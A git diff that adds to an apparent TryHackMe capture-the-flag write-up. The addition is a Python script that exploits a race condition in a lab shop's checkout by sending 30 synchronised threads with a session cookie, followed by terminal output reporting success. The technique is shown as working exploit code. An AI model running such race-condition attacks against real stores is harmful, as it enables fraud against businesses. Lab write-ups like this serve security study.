@@ -35,6 +35,78 @@ https://github.com/user-attachments/assets/09bd865d-607b-45ef-a3c1-ad40844ac44e
 
 <img width="951" height="456" alt="image" src="https://github.com/user-attachments/assets/7640e6d9-0f28-4388-8cfd-99bd88b2fdf7" />
 
+``` python
+
+import requests
+import threading
+
+cookie = "eyJjYXJ0Ijp7fSwidXNlciI6ImF0dGFja2VyIn0.anT97Q.NVUNzBToq8x57XGlNypMmLKhMps"
+
+url = "http://10.113.187.5"
+data = {"product_id":"plush-001","qty":1}
+
+NUM_THREADS = 30
+
+barrier = threading.Barrier(NUM_THREADS)
+
+def checkout():
+     try:
+         s = requests.Session()
+         s.cookies.set("session", updated_cookie)
+         req = requests.Request("POST", url + "/process_checkout")
+         prepared = s.prepare_request(req)
+         s.get(url + "/shop")
+         barrier.wait()
+         r = s.send(prepared)
+     except Exception as e:
+                           print(f"Error: {e}")
+
+
+s = requests.Session()
+s.cookies.set("session", cookie)
+r = s.post(url + "/add_to_cart", data=data)
+
+updated_cookie = None
+for c in s.cookies:
+    if c.name == "session":
+        updated_cookie = c.value
+
+print(f"[*] Add to cart: {r.status_code}")
+print(f"[*] Cookie actualizada: {updated_cookie}")
+
+threads = [threading.Thread(target=checkout) for x in range(NUM_THREADS)]
+
+for t in threads:
+
+      t.start()
+
+for t in threads:
+
+      t.join()
+
+
+r = requests.get(url + "/shop", cookies={"session": updated_cookie})
+
+if "-25" not in r.text:
+        print("Something was wrong")
+else:
+     print("Race condition was exploited succesfully")
+
+```
+
+``` bash
+
+❯ python3 race-condition.py
+[*] Add to cart: 200
+[*] Cookie actualizada: eyJjYXJ0Ijp7InBsdXNoLTAwMSI6MX0sInVzZXIiOiJhdHRhY2tlciJ9.anUULg.81Hq6pKBx6j2-ozE5wc9TU2WUiM
+Race condition was exploited succesfully
+╭─ ~/hacking/ctf/thm/walktroughs/race-conditions-toy-to-the-world                                                  ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
+
+<img width="957" height="545" alt="image" src="https://github.com/user-attachments/assets/4764ae99-b51c-42f1-a05a-c8ab1324213a" />
+
 
 
 
